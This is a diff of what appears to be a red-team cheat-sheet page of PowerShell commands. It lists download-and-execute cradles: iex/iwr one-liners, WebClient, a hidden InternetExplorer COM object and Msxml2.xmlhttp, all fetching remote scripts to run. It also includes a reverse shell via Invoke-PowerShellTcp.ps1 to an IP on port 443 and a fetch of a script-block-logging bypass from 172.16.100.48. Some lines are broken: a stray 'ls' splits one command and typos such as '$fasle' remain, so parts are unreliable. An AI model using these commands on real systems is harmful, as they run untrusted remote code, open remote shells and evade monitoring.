@@ -156,8 +156,7 @@ ls function:
 <pre class="language-powershell" data-overflow="wrap"><code class="lang-powershell">powershell iex (iwr -UseBasicParsing http://ip/Invoke-PowerShellTcp.ps1); Power -Reverse -IPAddress ip -Port 443 
 <strong>
 </strong>❗iex (iwr -UseBasicParsing http://172.16.100.48/sbloggingbypass.txt)
-<strong>
-</strong><strong>iex (New-Object Net.WebClient).DownloadString('https://webserver/pay.ps1') - Invoke Expression (iex alias)
+<strong>iex (New-Object Net.WebClient).DownloadString('https://webserver/pay.ps1') - Invoke Expression (iex alias)
 </strong></code></pre>
 
 **Download and **_**save**_** PowerShell Script**
@@ -172,7 +171,8 @@ ls function:
 
 {% code overflow="wrap" %}
 ```powershell
-$ie=New-Object -ComObject InternetExplorer.Application;$ie.visible=$False;$ie.navigate('https://webserver/pay.ps1');sleep 5;$response=$ie.Document.body.innerHTML;$ie.quit();iex $response
+$ie=New-Object -ComObject ls
+InternetExplorer.Application;$ie.visible=$False;$ie.navigate('https://webserver/pay.ps1');sleep 5;$response=$ie.Document.body.innerHTML;$ie.quit();iex $response
 ```
 {% endcode %}
 
@@ -180,7 +180,7 @@ $ie=New-Object -ComObject InternetExplorer.Application;$ie.visible=$False;$ie.na
 
 {% code overflow="wrap" %}
 ```powershell
-i Iex (iwr 'http://websever/ps.ps1') -iwr is alias for invoke-web request
+iex (iwr 'http://websever/ps.ps1') -iwr is alias for invoke-web request
  $h=New-Object -ComObject
 Msxml2.xmlhttp;$h.open('GET','http://webserver/ps.ps1',$fasle);$h.send();iex $h.responseText
 $wr = [System.NET.WebRequest]::Create("http://werbser.ps.ps1")
